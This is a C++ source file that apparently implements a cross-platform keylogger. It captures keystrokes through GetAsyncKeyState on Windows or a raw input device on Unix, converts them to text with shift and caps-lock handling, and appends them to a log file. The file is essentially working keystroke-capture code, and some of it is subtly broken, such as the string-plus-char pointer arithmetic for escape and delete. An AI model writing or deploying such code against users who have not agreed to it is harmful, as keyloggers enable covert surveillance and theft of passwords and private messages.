#include <iostream>
#include <fstream>
#include <stdexcept>
#include "keylog.h"
#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
#include <windows.h>
#include <windowsx.h>
#define MAX_VALUE 94
#elif __unix__
#include <poll.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#include <cstring>
#define MAX_VALUE 127
#endif // macros defined by cpp (C prprocessor)

using namespace std;

struct time {
    long seconds;
    long mill_sec;
};

struct input_event {
    struct time t;
    short type;
    short code;
    int value;
};

vcodes& operator++(vcodes& e) {
    switch(e) {
        case vcodes::TAB:
        e = vcodes(0x0C);
        break;
        case vcodes::RETURN:
        e = vcodes(0x10);
        break;
        case vcodes::CAPITAL:
        e = vcodes(0x1B);
        break;
        case vcodes::ESCAPE:
        e = vcodes(0x20);
        break;
        case vcodes::NUM_9:
        e = vcodes(0x41);
        break;
        case vcodes::APPS:
        e = vcodes(0x5F);
        break;
        case vcodes::DIVIDE:
        e = vcodes(0xBB);
        break;
        case vcodes::OEM_3:
        e = vcodes(0xDB);
        break;
        case vcodes::OEM_8:
        e = vcodes(0xFE);
        break;
        case vcodes::REAL_END:
        throw std::out_of_range("vcodes operator++");
        default:
        e = vcodes(static_cast<std::underlying_type<vcodes>::type>(e) + 1);
    }
    return e;
} // operator++


vector<vcodes> getPressedKeyboardState(string path) {
    vector<vcodes> pressed;
    static bool ar[MAX_VALUE];
    static bool capsLoc = false;
    #if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    int x = 0;
    for (vcodes v = vcodes::BACK; v != vcodes::REAL_END; ++v) {
        bool p = (GetAsyncKeyState((int)v) & 0x8000);
        if (v == vcodes::CAPITAL) {
            if (p && !ar[x]) {
                capsLoc = !capsLoc;
                ar[x] = true;
            } else if (!p) {
                ar[x] = false;
            }
            if (capsLoc) {
                pressed.push_back(v);
            }
            continue;
        }
        if (p && (!ar[x] || (v >= vcodes::SHIFT && v <= vcodes::MENU))) {
            ar[x] = true;
            pressed.push_back(v);
        } else if (!p) {
            ar[x] = false;
        }
        x++;
    }
    #elif __unix__
    static int fd  = open(&*path.begin(), O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        cerr << "path is incorrect.\n" << endl;
        exit(1);
    }
    int x = 0;
    static bool shift = false;
    static bool alt = false;
	struct pollfd f[1] = {fd, POLLIN, 0};
	int t = 50000;
	struct input_event s;
	if (poll(f, 1, t) <= 0) {
		cout << "ME" << endl;
		return pressed;
	} // if
    t = read(fd, &s, sizeof(s));
	x = s.code;
    vcodes v;
    try {
	    v = convert<set1, vcodes>(set1(x));
    } catch (invalid_argument const & ex) {
            return pressed;
    }
	if (v == vcodes::CAPITAL) {
			if (s.value == 1) {
                capsLoc = !capsLoc;
            }
	} else if (v == vcodes::SHIFT) {
        shift = s.value == 1 || s.value == 2;
    } else if(v == vcodes::MENU) {
        alt = s.value == 1 || s.value == 2;
    } else {
        if (s.value == 1 || s.value == 2) {
			pressed.push_back(v);
        }
	}
	if (capsLoc) {
		pressed.push_back(vcodes::CAPITAL);
	}
    if (shift) {
        pressed.push_back(vcodes::SHIFT);
    }
    if (alt) {
        pressed.push_back(vcodes::MENU);
    }
    #endif
    return pressed;
} // getAsyncKeyboardState

static bool contains(vector<vcodes> pr, vcodes v) {
    for (auto vc = pr.begin(); vc != pr.end(); ++vc) {
        if (*vc == v) {
            return true;
        }
    }
    return false;
}

string getAscii(vector<vcodes> pressed) {
    bool shift = contains(pressed, vcodes::SHIFT);
    bool capslock = contains(pressed, vcodes::CAPITAL);
    bool alt = contains(pressed, vcodes::MENU);
    string str;
    for(auto vc = pressed.begin(); vc != pressed.end(); ++vc) {
        if ((*vc >= vcodes::NUM_0 && *vc <= vcodes::NUM_9) || (*vc >= vcodes::NUMPAD0 && *vc <= vcodes::NUMPAD9)) {
            if (shift) {
                switch (*vc) {
                    case vcodes::NUMPAD0:
                    case vcodes::NUM_0:
                    str += ")";
                    break;
                    case vcodes::NUMPAD1:
                    case vcodes::NUM_1:
                    str += "!";
                    break;
                    case vcodes::NUMPAD2:
                    case vcodes::NUM_2:
                    str += "@";
                    break;
                    case vcodes::NUMPAD3:
                    case vcodes::NUM_3:
                    str += "#";
                    break;
                    case vcodes::NUMPAD4:
                    case vcodes::NUM_4:
                    str += "$";
                    break;
                    case vcodes::NUMPAD5:
                    case vcodes::NUM_5:
                    str += "%";
                    break;
                    case vcodes::NUMPAD6:
                    case vcodes::NUM_6:
                    str += "^";
                    break;
                    case vcodes::NUMPAD7:
                    case vcodes::NUM_7:
                    str += "&";
                    break;
                    case vcodes::NUMPAD8:
                    case vcodes::NUM_8:
                    str += "*";
                    break;
                    case vcodes::NUMPAD9:
                    case vcodes::NUM_9:
                    str += "(";
                    break;
                    default:
                    str += "";
                }
            } else {
                str += (char)*vc;
            }
        } else if (*vc >= vcodes::A && *vc <= vcodes::Z) {
            str += ((shift && !capslock) || (!shift && capslock))? (char)*vc : (char)((int)(*vc) + 32);
        } else if (*vc >= vcodes::MULTIPLY) {
            switch (*vc) {
                case vcodes::MULTIPLY:
                str += "*";
                break;
                case vcodes::OEM_1:
                str += (shift)? ":" : ";";
                break;
                case vcodes::DIVIDE:
                case vcodes::OEM_2:
                str += (shift)? "?" : "/";
                break;
                case vcodes::OEM_3:
                str += (shift)? "~" : "`";
                break;
                case vcodes::OEM_4:
                str += (shift)? "{" : "[";
                break;
                case vcodes::SEPARATOR:
                case vcodes::OEM_5:
                str += (shift)? "|" : "\\";
                break;
                case vcodes::OEM_6:
                str += (shift)? "}" : "]";
                break;
                case vcodes::OEM_7:
                str += (shift)? "\"" : "\'";
                break;
                case vcodes::OEM_8:
                str += (shift)? "" : "";
                break;
                case vcodes::OEM_COMMA:
                str += (shift)? "<" : ",";
                break;
                case vcodes::OEM_CLEAR:
                str += (shift)? "" : "";
                break;
                case vcodes::DECIMAL:
                case vcodes::OEM_PERIOD:
                str += (shift)? ">" : ".";
                break;
                case vcodes::ADD:
                case vcodes::OEM_PLUS:
                str += (shift)? "+" : "=";
                break;
                case vcodes::SUBTRACT:
                case vcodes::OEM_MINUS:
                str += (shift)? "_" : "-";
                break;
                default:
                str += "";
            }
        } else if (*vc >= vcodes::BACK && *vc <= vcodes::DELETE_KEY) {
            switch (*vc) {
                case vcodes::BACK:
                str += "\b";
                break;
                case vcodes::TAB:
                str += "\t";
                break;
                case vcodes::RETURN:
                str += "\n";
                break;
                case vcodes::ESCAPE:
                str += "" + (char)27;
                break;
                case vcodes::SPACE:
                str += " ";
                break;
                case vcodes::DELETE_KEY:
                str += "" + (char)127;
                break;
                default:
                str += "";
            }
        }
    }
    return str;
} // getAscii



void writeToFile(string file, string s) {
    static ofstream outFile{file, std::ios::app | std::ios::out};
    if (s.empty()) {
        return;
    }
    if (!outFile.is_open()) {
        cerr << "Cannot find " << file << endl;
        return;
    }
	cout << s << endl;
    outFile << s;
    outFile.flush();
} // writeToFile
